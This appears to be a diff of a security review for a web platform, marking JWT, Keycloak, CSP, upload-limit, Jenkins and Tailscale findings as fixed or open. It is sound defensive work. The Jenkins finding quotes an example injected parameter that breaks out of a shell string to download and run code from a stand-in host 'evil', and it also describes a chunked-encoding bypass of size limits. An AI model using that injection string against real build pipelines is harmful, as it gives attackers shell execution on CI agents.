@@ -31,26 +31,36 @@ Severity legend: **High** = fix before you treat this as production-secure; **Me
 > `Implementation_planning/archive/` rather than delete it — remediated reviews are the audit trail,
 > and this platform is explicitly aiming at a posture where that trail matters.
 
-| Finding | Status (2026-07-27) | Phase 7 goal |
+| Finding | Status (latest — see per-finding annotations) | Phase 7 goal |
 |---|---|---|
 | H1 — fail-open secret defaults | **FIXED** (Phase 5.5, BR-SEC-019) | — |
-| H2 — JWT audience not validated | **OPEN** | G6.2 (BR-SEC-020) |
-| H3 — Keycloak password policy + sslRequired | **OPEN** — zero movement | G6.4 |
-| M1 — no CSP | **OPEN** — recommended fix was not implementable as written, see annotation | G5 |
-| M2 — chunked-encoding size bypass | **OPEN**, and worse than described | G7.1 |
-| M3 — Jenkins param injection | **PARTIAL** — deploy half-fixed, backend untouched | G7.2 |
-| M4 — Tailscale dev tags `*:*` | **OPEN** — byte-identical | G7.3 |
+| H2 — JWT audience not validated | **CLOSED 2026-08-04** — `verify_aud: True` against the expected audience | G6.2 done |
+| H3 — Keycloak password policy + sslRequired | **CLOSED 2026-08-04** — policy, `sslRequired: external`, explicit brute-force params | G6.4 done |
+| M1 — no CSP | **PARTIAL 2026-08-04** — real nonce CSP in `proxy.ts`, still **Report-Only**; enforcement pending | G5 (G5.4 open) |
+| M2 — chunked-encoding size bypass | **CLOSED 2026-08-04** — streaming byte cap, dead validator removed, capped reads | G7.1 done |
+| M3 — Jenkins param injection | **CLOSED 2026-08-04** — both Jenkinsfiles gate params by regex + `withEnv` | G7.2 done |
+| M4 — Tailscale dev tags `*:*` | **CLOSED 2026-08-04** — no `*:*`; prod reachable only from `tag:dev1`/`tag:prod-ssh` | G7.3 done |
 | M5 — OIDC/etcd TLS verification off | **CLOSED 2026-08-04** — T6.3.1–T6.3.3 fixed; T6.3.4 (Postgres TLS) **accepted risk**, see annotation | G6.3 done |
-| M6 — etcd auth disabled | **CONFIRMED FIXED for prod/staging** (re-verified 2026-07-31) — dev-only pattern, correctly isolated; regression guard (T7.5.3) still to build | T7.5.2 done, G7.5 |
+| M6 — etcd auth disabled | **CLOSED** — fixed for prod/staging (2026-07-31); dev-only pattern correctly isolated, and the regression guard shipped (T7.5.3) | T7.5.2/T7.5.3 done, G7.5 done |
 | L1 — `.env_bak` not gitignored | **FIXED** | — |
-| L2 — host `.env*` world-readable | **FIXED for prod**, open staging/dev (now hold no secrets) | G7.5 |
-| L3 — deprecated `X-XSS-Protection` | **OPEN** — 4 plugin configs | G7.4 |
-| L4 — dev conveniences | **CONFIRMED FIXED for prod** (re-verified 2026-07-31) — regression guard (T7.5.3) still to build | T7.5.2 done, G7.5 |
+| L2 — host `.env*` world-readable | **CLOSED 2026-08-04** — staging/dev now `600` too; only `sonarqube/.env` left, documented | G7.5 done |
+| L3 — deprecated `X-XSS-Protection` | **CLOSED 2026-08-04** — `"0"` in all four plugin configs | G7.4 open on T7.4.2 |
+| L4 — dev conveniences | **CLOSED** — fixed for prod (2026-07-31); regression guard shipped (T7.5.3) and since extended by T7.7.2 | T7.5.2/T7.5.3 done, G7.5 done |
 | L5 — `referer-restriction bypass_missing` | **RECORDED, deliberately not fixed** — accepted as a spam filter, not a boundary | T7.5.1 done, G7.5 |
 | (post-review) APISIX admin UI on a static key | **CLOSED 2026-08-04** — `enable_admin_ui: false` for staging/prod; static-key residual **accepted risk** | T7.7.2 done, G7.7 done |
 
-**Not re-verified this pass** (host/infrastructure state rather than repo state): on-server file
-modes beyond those visible locally, and live Tailscale ACL enforcement.
+> **Re-verification pass, 2026-08-04.** Every row above was re-checked directly against source at
+> backend `e2e0f0f`, frontend `cb930b7`, deploy `0d1502a` — not carried forward from the planning
+> docs. Eight findings moved: H2, H3, M2, M3, M4, M5, L2 and L3 are now closed, and the post-review
+> admin-UI anomaly with them. **Two remain open: M1** (nonce CSP exists but is Report-Only —
+> enforcement is G5.4, gated on the live OIDC soak) **and G7.4's T7.4.2** (header-ownership table,
+> chained behind that same CSP work). Everything else in this document is either fixed or carries a
+> written accepted-risk record. This is a status refresh, **not** T8.3.2 — that task still owns the
+> formal Phase 7 closeout of this file.
+
+**Not re-verified this pass** (host state that cannot be checked from a repo checkout): on-server
+file modes beyond those visible locally, and live Tailscale ACL enforcement — the tailnet policy is
+applied by hand in the Admin Console, so the repo copy is the intent, not proof of what is live.
 
 **Findings discovered after this review** — recorded here so this document is not read as a
 complete picture. Full detail in `Implementation_planning/decisions.md` (2026-07-27) and
@@ -175,6 +185,8 @@ The app boots even when `CSRF__SECRET` / `DATABASE_URL` are unset, falling back 
 
 ### H2 — JWT audience not validated (`verify_aud: False`)
 > **[2026-07-27] STILL OPEN.** `haisir-backend/src/auth/user.py:73` — `"verify_aud": False,  # flexible audience`. Unchanged. Now **BR-SEC-020**; Phase 7 G6.2. Note the sequencing risk: enabling this without first confirming APISIX-injected tokens carry the expected `aud` will 401 every request, so T6.2.1 verifies before T6.2.2 enforces.
+>
+> **[2026-08-04] CONFIRMED FIXED — re-verified directly against backend `e2e0f0f`.** `src/auth/user.py:128` now sets `"verify_aud": True` and passes `audience=_EXPECTED_AUDIENCE` (`oauth.keycloak.admin_client_id`) into the decode. The audience probe added during T6.2.1 is retained as a diagnostic. Closes H2; **G6.2 done**.
 
 **Repo:** haisir-backend · `src/auth/user.py` (`verify_token`)
 Local JWKS validation checks signature, expiry, and issuer, but **not audience**. Any valid token from the realm — including the frontend client's own access token or a token minted for a *different* client — is accepted by the API (introspection only confirms the token is *active*, not that it targets this API). This is "audience confusion." The spec (`target/requirements/02_auth_and_roles.md:45`) already provisions an audience mapper adding `haisir-backend-admin` to `aud`, so the data to enforce this exists.
@@ -182,6 +194,8 @@ Local JWKS validation checks signature, expiry, and issuer, but **not audience**
 
 ### H3 — Keycloak realm: no password policy + `sslRequired: "none"`
 > **[2026-07-27] STILL OPEN — zero movement.** `common/keycloak/01-realm.json`: no `passwordPolicy` key at all; `sslRequired: "none"` at `:10`; `bruteForceProtected: true` at `:9` with `failureFactor`/`permanentLockout`/`maxDeltaTimeSeconds` all absent, and nothing in `common/scripts/setup-keycloak.sh` sets them. Phase 7 G6.4.
+>
+> **[2026-08-04] CONFIRMED FIXED — re-verified against `common/keycloak/01-realm.json`.** `passwordPolicy` present (`length(12) and notUsername and notEmail and passwordHistory(3)`), `sslRequired: "external"`, and the brute-force params now explicit rather than defaulted (`failureFactor: 30`, `maxDeltaTimeSeconds: 43200`, `permanentLockout: false`) alongside `bruteForceProtected: true`. MFA for `admin`/`institution_admin` was evaluated and deliberately deferred, not skipped — see `Implementation_planning/decisions.md` (2026-07-30). Closes H3; **G6.4 done**.
 
 **Repo:** haisir-deploy · `common/keycloak/01-realm.json`
 - `passwordPolicy` is **absent** → no minimum length, complexity, history, or breach check. For a platform you want to grow toward financial-grade, this is a baseline gap.
@@ -192,6 +206,8 @@ Local JWKS validation checks signature, expiry, and issuer, but **not audience**
 > **[2026-07-27] STILL OPEN — and the recommended fix is not implementable as written.** CSP is confirmed absent from all four plugin configs (the six other security headers *are* set there). But this review recommends a *nonce-based* CSP applied *at the gateway* via `response-rewrite` — those two requirements are incompatible. A nonce must be unique per request and appear on every inline tag in the rendered HTML; APISIX can set a header but cannot mint a value and inject it into the response body. A gateway CSP is necessarily static, forcing `script-src 'unsafe-inline'`. The nonce must be generated where the HTML is rendered. Corrected approach in `target/requirements/15_security_headers.md`; Phase 7 G5.
 >
 > Two facts that make this cheaper than the review assumed: `haisir-frontend/src/proxy.ts` already exists (Next 16 renamed `middleware`→`proxy`), and `src/app/csp-report/route.ts` already exists — though it currently accepts reports and **discards** them. 15 of 27 pages already carry `force-dynamic`; the remaining 12 (including all of `/onboarding/*` and `/admin/*`) are statically prerendered and must be opted into dynamic rendering first, since a build-time-rendered page cannot receive a per-request nonce.
+>
+> **[2026-08-04] NOW PARTIAL, no longer "nothing shipped".** `haisir-frontend/src/proxy.ts` mints a per-request base64 nonce and forwards `x-nonce` so Next.js attaches it to framework scripts — the corrected (render-side, not gateway-side) approach this annotation called for. But the header is still emitted as **`Content-Security-Policy-Report-Only`**, so nothing is enforced yet. Enforcement is G5.4, gated on the live-stack Keycloak OIDC soak (BR-CSP-007). **M1 stays open.**
 
 **Repo:** haisir-frontend (`next.config.ts`) + haisir-deploy (route/plugin configs)
 CSP is set **nowhere**: not in `next.config.ts` (no `headers()`), not on the frontend HTML routes (`10-home.json`, `99-catch-all` → `secured-anonymous`), and the backend only sets CSP on its own `/api` JSON responses. The SPA — the primary XSS target — ships with no CSP. XSS risk today is low (React escapes, `react-markdown` runs without `rehype-raw`), but CSP is the expected defense-in-depth layer.
@@ -199,6 +215,8 @@ CSP is set **nowhere**: not in `next.config.ts` (no `headers()`), not on the fro
 
 ### M2 — Request-size / file-upload limits bypassable via chunked encoding
 > **[2026-07-27] STILL OPEN, and worse than described.** The chunked-encoding bypass is confirmed at `request_middleware.py:151,169,194`. The upload *type* validation is not merely "trusts an attacker-controlled filename" — it is **dead code**: `_validate_file_uploads` reads a *request-level* `Content-Disposition`, but for `multipart/form-data` that header lives inside each body part, so it is always empty and the validator has never rejected anything (~45 lines). Separately, extraction uploads are **fully spooled to disk before** the 50 MB check (`admin_extraction.py:175-181`, `parent_extraction.py:182-188`), and a malformed `Content-Length` raises an unhandled `ValueError` → 500 rather than 400. Phase 7 G7.1.
+>
+> **[2026-08-04] CONFIRMED FIXED — all three sub-problems, re-verified against backend `e2e0f0f`.** (1) The chunked bypass is gone: a pure-ASGI streaming middleware enforces the byte cap on the body as it arrives, explicitly covering both declared-length and `Transfer-Encoding: chunked` requests. (2) The dead `_validate_file_uploads` (which read a request-level `Content-Disposition` that is always empty for multipart) has been removed rather than patched. (3) Extraction uploads no longer spool first — `read_upload_capped(file, _MAX_UPLOAD_BYTES)` caps during the read. G7.1's gate was additionally held open until a genuine over-the-wire chunked request proved 413 against a live uvicorn, and that test was verified to fail when the cap is neutered. Closes M2; **G7.1 done**.
 
 **Repo:** haisir-backend · `src/auth/request_middleware.py` (`SecurityValidationMiddleware`)
 Size and upload checks read `int(request.headers.get("content-length", 0))`. A client using `Transfer-Encoding: chunked` (no `Content-Length`) yields `0` → **all size/type gates are skipped**. Upload "type" validation also trusts the `Content-Disposition` filename, which is attacker-controlled.
@@ -207,6 +225,8 @@ Size and upload checks read `int(request.headers.get("content-length", 0))`. A c
 
 ### M3 — Jenkins: build parameters interpolated into shell (script injection)
 > **[2026-07-27] PARTIALLY FIXED.** `haisir-deploy/Jenkinsfile.deploy` now uses `withEnv` + single-quoted `sh` for the remote-exec path (`:139-146`, `:233`), but `params.VERSION` is still Groovy-interpolated into `MANIFEST_PATH` (`:58`) and a `sh """..."""` block (`:89-107`), with validation only `!params.VERSION?.trim()` (`:75`) — no charset regex, so path traversal and quote-breakout remain. **`haisir-backend/Jenkinsfile` is untouched** — `params.TAG` interpolated at `:197-198`, `:209`, `:305-306`, `:340`, no validation. Phase 7 G7.2.
+>
+> **[2026-08-04] CONFIRMED FIXED — both halves, re-verified in both repos.** `haisir-deploy/Jenkinsfile.deploy:81` gates `params.VERSION` on `^\d+\.\d+(\.\d+)?$` and errors otherwise, closing both the quote-breakout and the `MANIFEST_PATH` traversal variant. `haisir-backend/Jenkinsfile:25` — untouched at the last pass — now gates `params.TAG` on `^[A-Za-z0-9._-]+$`, and every downstream `sh` use goes through `withEnv(["TAG=..."])` with single-quoted scripts rather than Groovy interpolation. Closes M3; **G7.2 done**.
 
 **Repos:** haisir-backend `Jenkinsfile` (`params.TAG`), haisir-deploy `Jenkinsfile.deploy` (`params.VERSION`)
 `params.VERSION` is Groovy-interpolated into double-quoted `sh """..."""` blocks (e.g. `MANIFEST_PATH`, the version-match `echo`/`if`), and `params.TAG` into `docker build`/`docker tag`. Anyone able to trigger a parameterized build with `VERSION='1"; curl evil|sh; echo "'` gets shell execution on the Jenkins agent. (The deploy pipeline already correctly protects `REMOTE_HOST`/`REMOTE_USER` via `withEnv` + single-quoted `sh` — apply the same discipline to the params.) Path-traversal via `VERSION=../..` in `MANIFEST_PATH` is a lesser variant.
@@ -214,6 +234,8 @@ Size and upload checks read `int(request.headers.get("content-length", 0))`. A c
 
 ### M4 — Tailscale ACL: dev tags have `*:*` to the entire tailnet
 > **[2026-07-27] STILL OPEN — byte-identical to this review.** `other/services/tailscale/tailscale.json:28-35` still grants `dst: ["*:*"]` to `tag:dev1`/`tag:in-dev1`/`tag:in-dev2`; SSH from dev tags to `tag:prod` still granted at `:72-84`. Phase 7 G7.3.
+>
+> **[2026-08-04] CONFIRMED FIXED, and tightened well past the original ask.** No `dst: ["*:*"]` remains. `tag:dev1` now reaches prod on `3080,5432` only; `tag:in-dev1`/`tag:in-dev2` have **no** network path to `tag:prod` at all; prod SSH is gated behind the separate rarely-held `tag:prod-ssh`. Since then (T7.7.2, 2026-08-04) `9180` was removed from both `tag:prod` and `tag:staging`, and `5432` was added deliberately to prod and staging for operator `psql` — a restoration, since direct DB access broke silently when T7.3.1 narrowed off `*:*` without enumerating that port. Closes M4; **G7.3 done**. Standing caveat: this policy is applied by hand in the Tailscale Admin Console, so the repo copy can drift from what is live — which is exactly why T7.7.2 also closed the port binding rather than relying on the ACL alone.
 
 **Repo:** haisir-deploy · `other/services/tailscale/tailscale.json`
 `tag:dev1`, `tag:in-dev1`, `tag:in-dev2` → `dst: ["*:*"]`, and `tag:dev1`/`tag:in-dev1` get SSH to `prod`, `staging`, `ci`, `compute`. A single compromised dev laptop = full network reach and prod SSH. Blast radius is large.
@@ -291,6 +313,8 @@ etcd is the source of truth for every APISIX route, upstream, and plugin secret.
 
 ### L2 — On-host secret files are world-readable/executable
 > **[2026-07-27] FIXED for prod; open for staging/dev, but materially de-risked.** `prod/.env` and `prod/.env.config.sh` are now `-rw-------`. `staging/.env` is `-rwxr-xr-x`, `staging/.env.config.sh` `-rwxrwxr-x`, `dev/.env` `-rwxr-xr-x` — but since Phase 5.6 **those files contain zero secrets** (image tags, ports, Tailscale IPs, model specs, URLs only). Remaining plaintext outside the OpenBao boundary: `dev/.env`'s `PGADMIN_DEFAULT_PASSWORD` and `other/services/sonarqube/.env`'s `SONAR_DB_PASSWORD` (mode 0664). Phase 7 G7.5/G7.7.
+>
+> **[2026-08-04] CONFIRMED FIXED — mode-only check, no file contents read.** `staging/.env`, `staging/.env.config.sh` and `dev/.env` are all `600` now, matching prod. The only remaining group/world-readable secret file is `other/services/sonarqube/.env` (`664`), which T7.7.5 deliberately documented as outside the OpenBao boundary rather than migrating it. Closes L2; **G7.5 done**.
 
 **Repo:** haisir-deploy · `prod/.env`, `prod/.env_bak`, `prod/.env.config.sh` are mode `-rwxr-xr-x` (755).
 Secrets readable by any local user and needlessly executable.
@@ -298,6 +322,8 @@ Secrets readable by any local user and needlessly executable.
 
 ### L3 — Deprecated `X-XSS-Protection: 1; mode=block`
 > **[2026-07-27] STILL OPEN.** Set on all four plugin configs. A four-file edit; now **BR-CSP-006**, Phase 7 G7.4 — sequenced with the CSP work since CSP is what replaces it.
+>
+> **[2026-08-04] CONFIRMED FIXED.** `"X-XSS-Protection": "0"` in all four plugin configs (`01-secured-authenticated`, `02-secured-anonymous`, `03-secured-api`, `04-secured-api-upload`) — the deprecated filter is now explicitly disabled rather than enabled. Closes L3. **G7.4 itself stays open** on T7.4.2 (reconciling the header-ownership table), which is chained behind the frontend CSP work in G5.
 
 **Repos:** haisir-backend `security_middleware.py` / config, haisir-deploy `response-rewrite`.
 The `X-XSS-Protection` filter is deprecated and, when enabled, has itself caused vulnerabilities in some browsers. Modern guidance is `X-XSS-Protection: 0` and rely on CSP (see M1).
